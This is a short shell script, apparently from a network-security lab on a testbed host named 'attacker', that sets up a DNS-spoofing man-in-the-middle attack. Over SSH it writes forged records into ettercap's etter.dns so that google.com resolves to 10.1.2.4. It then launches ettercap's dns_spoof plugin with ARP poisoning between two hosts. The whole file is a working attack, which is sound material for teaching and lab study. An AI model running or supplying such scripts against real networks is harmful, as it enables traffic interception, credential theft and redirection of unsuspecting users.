#!/bin/sh

# Update configuration file
ssh attacker.facchinetti-dns.offtech "cat << EOF | sudo tee -a /etc/ettercap/etter.dns
.google.com A 10.1.2.4
google.com A 10.1.2.4
www.google.com PTR 10.1.2.4
EOF"

ETH=$1
ssh attacker.facchinetti-dns.offtech sudo ettercap --plugin dns_spoof --text --iface ${ETH} --nopromisc --mitm arp /10.1.2.2/// /10.1.2.3///